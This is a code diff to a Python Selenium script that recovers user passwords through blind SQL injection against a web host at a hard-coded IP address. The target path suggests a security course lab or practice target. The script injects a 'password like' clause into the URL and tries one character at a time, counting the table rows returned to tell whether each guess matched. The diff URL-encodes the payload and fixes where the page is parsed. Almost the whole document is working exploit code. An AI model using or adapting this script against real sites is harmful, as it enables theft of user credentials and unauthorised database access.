@@ -34,7 +34,7 @@ def sql():
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)
 
-    soup = BeautifulSoup(driver.page_source)  # Get the page contents and use for parsing.
+    # soup = BeautifulSoup(driver.page_source)  # Get the page contents and use for parsing.
     # tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.
 
     # TODO: Populate the user_pass_list
@@ -48,10 +48,11 @@ def sql():
             flag = False
             for j in range(32, 127):
                 pwd_n = pwd + chr(j)
-                url = "http://35.225.46.109/sql_injection/low/id/{}' and password like '{}%';--".format(i, pwd_n)
+                url = 'http://35.225.46.109/sql_injection/low/id/{}%27%20and%20password%20like%20%27{}%25%27%3B--' \
+                    .format(i, pwd_n)
                 driver.get(url)
+                soup = BeautifulSoup(driver.page_source)
                 tr_elements = soup.find_all('tr')
-                print(pwd_n, len(tr_elements))
                 if len(tr_elements) == 2:
                     pwd = pwd_n
                     flag = True
